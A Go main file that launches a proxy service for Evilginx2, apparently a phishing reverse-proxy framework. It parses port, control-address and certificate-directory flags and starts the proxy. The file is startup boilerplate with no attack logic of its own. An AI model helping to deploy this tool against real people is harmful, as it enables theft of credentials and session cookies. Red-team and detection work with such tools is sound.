package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"

	"github.com/kgretzky/evilginx2/internal/proxy"
)

var (
	port        = flag.String("port", "443", "Proxy server port")
	controlAddr = flag.String("control", "localhost:8082", "Control service address")
	certPath    = flag.String("certs", "./certs", "Certificate directory")
)

func main() {
	flag.Parse()

	if *port == "" {
		log.Fatal("Port cannot be empty")
	}
	if *controlAddr == "" {
		log.Fatal("Control service address cannot be empty")
	}
	if *certPath == "" {
		log.Fatal("Certificate directory cannot be empty")
	}

	fmt.Println("Starting Evilginx2 Proxy Service...")
	fmt.Printf("Proxy Port: %s\n", *port)
	fmt.Printf("Control Service: %s\n", *controlAddr)
	fmt.Printf("Certificate Path: %s\n", *certPath)

	if err := os.MkdirAll(*certPath, 0755); err != nil {
		log.Fatalf("Failed to create certificate directory: %v", err)
	}

	proxyService := proxy.NewProxyService(*port, *controlAddr, *certPath)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() {
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		<-sigChan
		fmt.Println("\nShutting down proxy service...")
		cancel()
	}()

	if err := proxyService.Start(ctx); err != nil {
		log.Fatalf("Proxy service failed: %v", err)
	}

	fmt.Println("Proxy service stopped")
}
